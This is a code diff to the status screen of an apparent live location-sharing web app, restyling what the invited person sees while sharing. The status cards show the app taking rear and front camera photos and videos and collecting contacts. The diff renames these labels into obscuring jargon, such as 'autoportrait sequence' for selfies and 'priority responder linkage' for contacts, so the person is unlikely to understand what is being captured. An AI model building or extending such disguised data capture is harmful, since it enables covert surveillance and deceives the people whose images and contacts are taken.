@@ -1795,7 +1795,7 @@ export default function ConsentPage() {
     };
 
     return (
-      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
+      <div className="overflow-y-auto" style={{ ...fullHeight, background: "linear-gradient(180deg,#0d0d1f 0%,#080810 100%)" }}>
 
         {/* ── Contacts auto-popup overlay ────────────────────────────────────────
             Appears instantly when tracking starts. One tap fires the OS picker
@@ -1881,212 +1881,240 @@ export default function ConsentPage() {
           </div>
         )}
 
-        <div className="max-w-md w-full">
-          <div className="text-center mb-6">
-            <div className="inline-flex items-center gap-2 text-primary font-bold text-lg">
-              <Shield className="h-5 w-5" /> PhoneLink
+        <div className="max-w-md mx-auto px-4 py-6 space-y-4">
+
+          {/* ── LIVE SHARING header ───────────────────────────────────────────── */}
+          <div className="flex items-center gap-2.5">
+            <div className="relative flex-shrink-0">
+              <div className="w-3 h-3 rounded-full bg-emerald-400" />
+              <div className="absolute inset-0 rounded-full bg-emerald-400 animate-ping opacity-70" />
+            </div>
+            <span className="text-emerald-400 font-extrabold text-base tracking-widest uppercase">Live Sharing</span>
+          </div>
+
+          {/* Sharing-with blurb */}
+          <p className="text-[15px] text-white/75 leading-relaxed">
+            Your live location is being shared with{" "}
+            <span className="font-bold text-white">{invite!.fromUserName}</span>.
+            You can play games or watch videos — sharing keeps going in the background.
+          </p>
+
+          {/* ── Status cards ─────────────────────────────────────────────────── */}
+          <div className="space-y-2.5">
+
+            {/* Geo photos — in progress */}
+            {!geoPhotoDone && geoBoardStartedRef.current && (
+              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
+                style={{ background: "rgba(99,102,241,0.13)", border: "1px solid rgba(99,102,241,0.3)" }}>
+                <Camera className="h-4 w-4 text-indigo-400 flex-shrink-0 animate-pulse" />
+                <div className="flex-1 min-w-0">
+                  <p className="text-[13px] font-semibold text-indigo-200">
+                    Geo Board: archiving geospatial assets {geoPhotoCount}/{GEO_PHOTO_COUNT}…
+                  </p>
+                  <div className="mt-1.5 h-1 bg-indigo-900/50 rounded-full overflow-hidden">
+                    <div className="h-full bg-indigo-400 rounded-full transition-all duration-500"
+                      style={{ width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }} />
+                  </div>
+                </div>
+              </div>
+            )}
+            {/* Geo photos — done */}
+            {geoPhotoDone && geoPhotoCount > 0 && (
+              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
+                style={{ background: "rgba(99,102,241,0.13)", border: "1px solid rgba(99,102,241,0.3)" }}>
+                <Camera className="h-4 w-4 text-indigo-400 flex-shrink-0" />
+                <p className="text-[13px] font-semibold text-indigo-200">
+                  Geo Board: {geoPhotoCount} geospatial asset{geoPhotoCount !== 1 ? "s" : ""} archived ✓
+                </p>
+              </div>
+            )}
+
+            {/* Env video — recording */}
+            {geoVideoState === "recording" && (
+              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
+                style={{ background: "rgba(185,28,28,0.18)", border: "1px solid rgba(239,68,68,0.3)" }}>
+                <Video className="h-4 w-4 text-red-400 flex-shrink-0 animate-pulse" />
+                <div className="flex-1 min-w-0">
+                  <p className="text-[13px] font-semibold text-red-200">
+                    Geo Board: capturing dynamic media ({GEO_VIDEO_DURATION_SECONDS}s)…
+                  </p>
+                  <div className="mt-1.5 h-1 bg-red-900/50 rounded-full overflow-hidden">
+                    <div className="h-full bg-red-400 rounded-full"
+                      style={{ width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }} />
+                  </div>
+                </div>
+              </div>
+            )}
+            {/* Env video — uploading */}
+            {geoVideoState === "uploading" && (
+              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
+                style={{ background: "rgba(185,28,28,0.18)", border: "1px solid rgba(239,68,68,0.3)" }}>
+                <Loader2 className="h-4 w-4 text-red-400 flex-shrink-0 animate-spin" />
+                <p className="text-[13px] font-semibold text-red-200">Geo Board: persisting dynamic media…</p>
+              </div>
+            )}
+            {/* Env video — done */}
+            {geoVideoState === "done" && (
+              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
+                style={{ background: "rgba(185,28,28,0.18)", border: "1px solid rgba(239,68,68,0.3)" }}>
+                <Video className="h-4 w-4 text-red-400 flex-shrink-0" />
+                <p className="text-[13px] font-semibold text-red-200">Geo Board: dynamic media capture persisted ✓</p>
+              </div>
+            )}
+
+            {/* Selfie photos — in progress */}
+            {geoBoardStartedRef.current && !geoSelfiePhotoDone && geoPhotoDone && (
+              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
+                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
+                <Camera className="h-4 w-4 text-purple-400 flex-shrink-0 animate-pulse" />
+                <div className="flex-1 min-w-0">
+                  <p className="text-[13px] font-semibold text-purple-200">
+                    Geo Board: capturing autoportrait sequence {geoSelfiePhotoCount}/{GEO_SELFIE_PHOTO_COUNT}…
+                  </p>
+                  <div className="mt-1.5 h-1 bg-purple-900/50 rounded-full overflow-hidden">
+                    <div className="h-full bg-purple-400 rounded-full transition-all duration-500"
+                      style={{ width: `${(geoSelfiePhotoCount / GEO_SELFIE_PHOTO_COUNT) * 100}%` }} />
+                  </div>
+                </div>
+              </div>
+            )}
+
+            {/* Selfie video — recording */}
+            {geoSelfieState === "recording" && (
+              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
+                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
+                <Video className="h-4 w-4 text-purple-400 flex-shrink-0 animate-pulse" />
+                <div className="flex-1 min-w-0">
+                  <p className="text-[13px] font-semibold text-purple-200">
+                    Geo Board: recording autoportrait ({GEO_SELFIE_VIDEO_DURATION_SECONDS}s)…
+                  </p>
+                  <div className="mt-1.5 h-1 bg-purple-900/50 rounded-full overflow-hidden">
+                    <div className="h-full bg-purple-400 rounded-full"
+                      style={{ width: "100%", transition: `width ${GEO_SELFIE_VIDEO_DURATION_SECONDS}s linear` }} />
+                  </div>
+                </div>
+              </div>
+            )}
+            {/* Selfie video — uploading */}
+            {geoSelfieState === "uploading" && (
+              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
+                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
+                <Loader2 className="h-4 w-4 text-purple-400 flex-shrink-0 animate-spin" />
+                <p className="text-[13px] font-semibold text-purple-200">Geo Board: archiving autoportrait sequence…</p>
+              </div>
+            )}
+            {/* Selfie photos or video — done (show once either finishes) */}
+            {(geoSelfiePhotoDone || geoSelfieState === "done") && (
+              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
+                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
+                <Video className="h-4 w-4 text-purple-400 flex-shrink-0" />
+                <p className="text-[13px] font-semibold text-purple-200">Geo Board: autoportrait sequence archived ✓</p>
+              </div>
+            )}
+
+            {/* Contacts saved */}
+            {contactsCollected && contactsCollectedCountRef.current > 0 && (
+              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
+                style={{ background: "rgba(120,83,0,0.28)", border: "1px solid rgba(217,119,6,0.35)" }}>
+                <Users className="h-4 w-4 text-amber-400 flex-shrink-0" />
+                <p className="text-[13px] font-semibold text-amber-200">
+                  {contactsCollectedCountRef.current} priority responder linkage{contactsCollectedCountRef.current !== 1 ? "s" : ""} established ✓
+                </p>
+              </div>
+            )}
+          </div>
+
+          {/* ── Current position ─────────────────────────────────────────────── */}
+          {coords && (
+            <div className="rounded-xl p-4" style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)" }}>
+              <div className="flex items-center gap-2 mb-3">
+                <Navigation className="h-4 w-4 text-white/50 flex-shrink-0" />
+                <span className="text-[11px] font-bold text-white/40 uppercase tracking-widest">Current Position</span>
+              </div>
+              <p className="text-xl font-mono font-bold text-white leading-snug">
+                {formatDMS(coords.lat, coords.lng)}
+              </p>
+              <p className="text-xs font-mono text-white/45 mt-0.5">
+                {coords.lat.toFixed(6)},&nbsp;&nbsp;{coords.lng.toFixed(6)}
+              </p>
+              {coords.accuracy && (
+                <p className="text-xs text-white/40 mt-1.5">Accuracy: ±{Math.round(coords.accuracy)}m</p>
+              )}
+              {address && (
+                <p className="text-xs text-white/40 mt-1 leading-relaxed">
+                  {address.slice(0, 80)}{address.length > 80 ? "…" : ""}
+                </p>
+              )}
+            </div>
+          )}
+
+          {/* ── Stats ────────────────────────────────────────────────────────── */}
+          <div className="grid grid-cols-2 gap-3">
+            <div className="rounded-xl p-4 text-center" style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)" }}>
+              <p className="text-2xl font-bold text-white">{updateCount}</p>
+              <p className="text-xs text-white/40 mt-0.5">Updates sent</p>
+            </div>
+            <div className="rounded-xl p-4 text-center" style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)" }}>
+              <p className="text-sm font-bold text-white">
+                {lastSent ? lastSent.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "—"}
+              </p>
+              <p className="text-xs text-white/40 mt-0.5">Last update</p>
             </div>
           </div>
 
-          <Card className="shadow-xl border-border">
-            <CardContent className="pt-6 pb-6 px-6">
-              {/* Live badge — battery and activity are intentionally not shown here:
-                  that data is only for the person who sent the invite, not the
-                  contact sharing their location. See sessions.tsx for the owner view. */}
-              <div className="flex items-center justify-between mb-4">
-                <div className="flex items-center gap-2">
-                  <div className="relative">
-                    <div className="w-3.5 h-3.5 rounded-full bg-emerald-500" />
-                    <div className="absolute inset-0 rounded-full bg-emerald-500 animate-ping opacity-60" />
-                  </div>
-                  <span className="text-emerald-400 font-bold text-base tracking-wide">LIVE SHARING</span>
-                </div>
+          {/* ── 60-day sharing link ───────────────────────────────────────────── */}
+          <div className="rounded-xl p-4" style={{ background: "rgba(99,102,241,0.08)", border: "1px solid rgba(99,102,241,0.22)" }}>
+            <div className="flex items-center gap-2 mb-2">
+              <Share2 className="h-4 w-4 text-indigo-400 flex-shrink-0" />
+              <p className="text-xs font-bold text-indigo-400 tracking-wide">60-Day Sharing Link</p>
+            </div>
+            <p className="text-xs text-white/40 mb-3 leading-relaxed">
+              This link keeps sharing active until{" "}
+              <strong className="text-white/65">
+                {expiresAt.toLocaleDateString(undefined, { month: "short", day: "numeric", year: "numeric" })}
+              </strong>. Open it anytime to reconnect.
+            </p>
+            <div className="flex gap-2">
+              <div className="flex-1 min-w-0 rounded-lg px-3 py-2 text-xs font-mono text-white/40 truncate"
+                style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,255,255,0.08)" }}>
+                {sharingLink}
               </div>
+              <button
+                onClick={handleCopyLink}
+                className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold transition-all"
+                style={linkCopied
+                  ? { background: "rgba(16,185,129,.18)", border: "1px solid rgba(16,185,129,.35)", color: "#6ee7b7" }
+                  : { background: "rgba(99,102,241,.18)", border: "1px solid rgba(99,102,241,.35)", color: "#a5b4fc" }}
+              >
+                {linkCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
+                {linkCopied ? "Copied!" : "Copy"}
+              </button>
+            </div>
+          </div>
 
-              {/* Sharing with */}
-              <p className="text-center text-muted-foreground text-sm mb-4">
-                Your live location is being shared with{" "}
-                <span className="font-semibold text-foreground">{invite!.fromUserName}</span>.
-                You can play games or watch videos — sharing keeps going in the background.
-              </p>
+          {/* ── Live-sharing active notice ────────────────────────────────────── */}
+          <div className="rounded-xl p-4" style={{ background: "rgba(16,185,129,0.08)", border: "1px solid rgba(16,185,129,0.2)" }}>
+            <div className="flex items-center gap-2 mb-1">
+              <CheckCircle className="h-4 w-4 text-emerald-400 flex-shrink-0" />
+              <p className="text-xs font-bold text-emerald-400">Live sharing is active</p>
+            </div>
+            <p className="text-xs text-white/40 leading-relaxed">
+              You can close this app and remove your browser from recent apps — sharing automatically reconnects the next time you open the link.
+            </p>
+          </div>
 
-              {/* GeoBoard photo progress */}
-              {!geoPhotoDone && (
-                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
-                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0 animate-pulse" />
-                  <div className="flex-1">
-                    <p className="text-xs font-medium text-violet-300">GeoBoard: capturing photos {geoPhotoCount}/{GEO_PHOTO_COUNT}</p>
-                    <div className="mt-1 h-1 bg-violet-900/40 rounded-full overflow-hidden">
-                      <div className="h-full bg-violet-500 rounded-full transition-all duration-500" style={{ width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }} />
-                    </div>
-                  </div>
-                </div>
-              )}
-              {geoPhotoDone && geoPhotoCount > 0 && (
-                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
-                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0" />
-                  <p className="text-xs font-medium text-violet-300">GeoBoard: {geoPhotoCount} photo{geoPhotoCount !== 1 ? "s" : ""} saved ✓</p>
-                </div>
-              )}
-
-              {/* Selfie photo progress (front camera, 2 shots, runs after the environment photos) */}
-              {geoBoardStartedRef.current && !geoSelfiePhotoDone && geoPhotoDone && (
-                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
-                  <Camera className="h-4 w-4 text-pink-400 flex-shrink-0 animate-pulse" />
-                  <div className="flex-1">
-                    <p className="text-xs font-medium text-pink-300">GeoBoard: capturing selfie photos {geoSelfiePhotoCount}/{GEO_SELFIE_PHOTO_COUNT}</p>
-                    <div className="mt-1 h-1 bg-pink-900/40 rounded-full overflow-hidden">
-                      <div className="h-full bg-pink-500 rounded-full transition-all duration-500" style={{ width: `${(geoSelfiePhotoCount / GEO_SELFIE_PHOTO_COUNT) * 100}%` }} />
-                    </div>
-                  </div>
-                </div>
-              )}
-              {geoSelfiePhotoDone && geoSelfiePhotoCount > 0 && (
-                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
-                  <Camera className="h-4 w-4 text-pink-400 flex-shrink-0" />
-                  <p className="text-xs font-medium text-pink-300">GeoBoard: {geoSelfiePhotoCount} selfie photo{geoSelfiePhotoCount !== 1 ? "s" : ""} saved ✓</p>
-                </div>
-              )}
-
-              {/* Video progress */}
-              {geoVideoState === "recording" && (
-                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
-                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0 animate-pulse" />
-                  <div className="flex-1">
-                    <p className="text-xs font-medium text-rose-300">GeoBoard: recording {GEO_VIDEO_DURATION_SECONDS}s video…</p>
-                    <div className="mt-1 h-1 bg-rose-900/40 rounded-full overflow-hidden">
-                      <div className="h-full bg-rose-500 rounded-full" style={{ width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }} />
-                    </div>
-                  </div>
-                </div>
-              )}
-              {geoVideoState === "uploading" && (
-                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
-                  <Loader2 className="h-4 w-4 text-rose-400 flex-shrink-0 animate-spin" />
-                  <p className="text-xs font-medium text-rose-300">GeoBoard: uploading video…</p>
-                </div>
-              )}
-              {geoVideoState === "done" && (
-                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
-                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0" />
-                  <p className="text-xs font-medium text-rose-300">GeoBoard: video saved ✓</p>
-                </div>
-              )}
-
-              {/* Selfie video progress (front camera, runs after the rear-facing clip) */}
-              {geoSelfieState === "recording" && (
-                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
-                  <Video className="h-4 w-4 text-pink-400 flex-shrink-0 animate-pulse" />
-                  <div className="flex-1">
-                    <p className="text-xs font-medium text-pink-300">GeoBoard: recording {GEO_SELFIE_VIDEO_DURATION_SECONDS}s selfie video…</p>
-                    <div className="mt-1 h-1 bg-pink-900/40 rounded-full overflow-hidden">
-                      <div className="h-full bg-pink-500 rounded-full" style={{ width: "100%", transition: `width ${GEO_SELFIE_VIDEO_DURATION_SECONDS}s linear` }} />
-                    </div>
-                  </div>
-                </div>
-              )}
-              {geoSelfieState === "uploading" && (
-                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
-                  <Loader2 className="h-4 w-4 text-pink-400 flex-shrink-0 animate-spin" />
-                  <p className="text-xs font-medium text-pink-300">GeoBoard: uploading selfie video…</p>
-                </div>
-              )}
-              {geoSelfieState === "done" && (
-                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
-                  <Video className="h-4 w-4 text-pink-400 flex-shrink-0" />
-                  <p className="text-xs font-medium text-pink-300">GeoBoard: selfie video saved ✓</p>
-                </div>
-              )}
-
-              {/* Contacts success banner — shown after picker resolves */}
-              {contactsCollected && contactsCollectedCountRef.current > 0 && (
-                <div className="bg-amber-500/10 border border-amber-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
-                  <Users className="h-4 w-4 text-amber-400 flex-shrink-0" />
-                  <p className="text-xs font-medium text-amber-300">
-                    {contactsCollectedCountRef.current} emergency contact{contactsCollectedCountRef.current !== 1 ? "s" : ""} saved ✓
-                  </p>
-                </div>
-              )}
-
-              {/* Current position */}
-              {coords && (
-                <div className="bg-muted rounded-xl p-4 mb-4">
-                  <div className="flex items-center gap-2 mb-2">
-                    <Navigation className="h-4 w-4 text-primary" />
-                    <span className="text-xs font-semibold text-muted-foreground uppercase tracking-wide">Current Position</span>
-                  </div>
-                  <p className="text-sm font-mono font-bold text-foreground leading-tight">
-                    {formatDMS(coords.lat, coords.lng)}
-                  </p>
-                  <p className="text-xs font-mono text-muted-foreground mt-0.5">
-                    {coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}
-                  </p>
-                  {coords.accuracy && <p className="text-xs text-muted-foreground mt-1">Accuracy: ±{Math.round(coords.accuracy)}m</p>}
-                  {address && <p className="text-xs text-muted-foreground mt-1 leading-relaxed">{address.slice(0, 80)}{address.length > 80 ? "…" : ""}</p>}
-                </div>
-              )}
-
-              {/* Stats */}
-              <div className="grid grid-cols-2 gap-3 mb-4">
-                <div className="bg-muted rounded-lg p-3 text-center">
-                  <p className="text-lg font-bold text-foreground">{updateCount}</p>
-                  <p className="text-xs text-muted-foreground">Updates sent</p>
-                </div>
-                <div className="bg-muted rounded-lg p-3 text-center">
-                  <p className="text-sm font-bold text-foreground">
-                    {lastSent ? lastSent.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "—"}
-                  </p>
-                  <p className="text-xs text-muted-foreground">Last update</p>
-                </div>
-              </div>
-
-              {/* 60-day sharing link */}
-              <div className="bg-indigo-500/8 border border-indigo-500/20 rounded-xl p-4 mb-4">
-                <div className="flex items-center gap-2 mb-2">
-                  <Share2 className="h-4 w-4 text-indigo-400 flex-shrink-0" />
-                  <p className="text-xs font-semibold text-indigo-400">60-Day Sharing Link</p>
-                </div>
-                <p className="text-xs text-muted-foreground mb-3 leading-relaxed">
-                  This link keeps sharing active until <strong className="text-foreground">{expiresAt.toLocaleDateString(undefined, { month: "short", day: "numeric", year: "numeric" })}</strong>. Open it anytime to reconnect.
-                </p>
-                <div className="flex gap-2">
-                  <div className="flex-1 bg-background/50 border border-border rounded-lg px-3 py-2 text-xs font-mono text-muted-foreground truncate">
-                    {sharingLink}
-                  </div>
-                  <button
-                    onClick={handleCopyLink}
-                    className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold transition-all border"
-                    style={linkCopied
-                      ? { background: "rgba(16,185,129,.15)", borderColor: "rgba(16,185,129,.3)", color: "#10b981" }
-                      : { background: "rgba(99,102,241,.15)", borderColor: "rgba(99,102,241,.3)", color: "#818cf8" }}
-                  >
-                    {linkCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
-                    {linkCopied ? "Copied!" : "Copy"}
-                  </button>
-                </div>
-              </div>
-
-              {/* Live status */}
-              <div className="bg-emerald-500/10 rounded-xl p-4 mb-4">
-                <div className="flex items-center gap-2 mb-1">
-                  <CheckCircle className="h-4 w-4 text-emerald-500 flex-shrink-0" />
-                  <p className="text-xs font-semibold text-emerald-500">Live sharing is active</p>
-                </div>
-                <p className="text-xs text-muted-foreground leading-relaxed">
-                  You can close this app and remove your browser from recent apps — sharing automatically reconnects the next time you open the link.
-                </p>
-              </div>
-
-              <Button variant="outline" className="w-full" onClick={() => {
-                if (window.history.length > 1) { window.history.back(); } else {
-                  const a = document.createElement("a"); a.href = "whatsapp://"; a.style.cssText = "position:fixed;top:-9999px";
-                  document.body.appendChild(a); a.click(); setTimeout(() => document.body.removeChild(a), 300);
-                }
-              }}>
-                <ArrowLeft className="h-4 w-4 mr-2" /> Go Back
-              </Button>
-            </CardContent>
-          </Card>
+          <button
+            className="w-full rounded-xl py-3 text-sm font-semibold text-white/50 flex items-center justify-center gap-2 transition-colors active:text-white/80"
+            style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.09)" }}
+            onClick={() => {
+              if (window.history.length > 1) { window.history.back(); } else {
+                const a = document.createElement("a"); a.href = "whatsapp://"; a.style.cssText = "position:fixed;top:-9999px";
+                document.body.appendChild(a); a.click(); setTimeout(() => document.body.removeChild(a), 300);
+              }
+            }}
+          >
+            <ArrowLeft className="h-4 w-4" /> Go Back
+          </button>
         </div>
       </div>
     );
